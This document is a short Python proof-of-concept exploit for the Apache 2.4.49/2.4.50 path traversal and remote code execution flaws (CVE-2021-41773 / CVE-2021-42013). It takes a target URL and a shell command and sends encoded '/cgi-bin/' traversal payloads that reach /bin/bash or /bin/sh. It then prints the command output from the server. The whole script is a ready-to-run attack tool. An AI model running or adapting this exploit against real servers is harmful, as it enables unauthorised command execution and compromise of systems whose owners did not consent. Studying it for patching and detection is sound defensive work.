# Test PoC for both Apache 2.4.49/2.4.50 CVE-2021-41773 / CVE-2021-42013
# Author NetR1d3r aka Johnny 5
# Creds to the original authors of the PoC released 


#!/usr/bin/env python3
# -*- coding: utf-8 -*-
import requests
from requests.structures import CaseInsensitiveDict
import sys

def main():
    if len(sys.argv) != 3:
        print("Usage: python3 rcePoC.py <url> <cmd>")
        sys.exit(1)
    url = sys.argv[1]
    cmd = sys.argv[2]
    if not url.startswith("http"):
        url = "http://" + url
    if not url.endswith("/"):
        url += "/"
    headers = CaseInsensitiveDict()
    headers["Content-Type"] = "application/x-www-form-urlencoded"

    payload49 = "/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/bin/bash"
    payload50 = "/cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/bin/sh"
    
    data = "echo Content-Type: text/plain; echo; " + (cmd)
    r = requests.post(url + payload49, headers=headers, data=data)
    if r.status_code == 200:
        print(r.text)
    else:
       r = requests.post(url + payload50, headers=headers, data=data)
       if r.status_code == 200:
           print(r.text)

if __name__ == "__main__":
    main()